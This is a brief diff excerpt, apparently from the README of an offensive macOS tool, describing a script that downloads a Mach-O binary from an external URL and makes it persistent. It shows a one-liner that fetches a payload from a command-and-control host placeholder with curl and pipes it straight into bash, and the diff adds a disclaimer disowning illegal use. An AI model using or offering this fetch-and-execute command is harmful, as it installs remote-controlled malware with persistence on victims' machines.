@@ -12,3 +12,4 @@ Script for OSX downloads a Mach-O file from external url then making persistence
 ##### ONE LINER OSX
 `$ curl -s -k https://C2C_IP/osx_persistence | bash`
 
+*Please note that i'm not responsible for any damages and illegal use. Don't be a twat!*
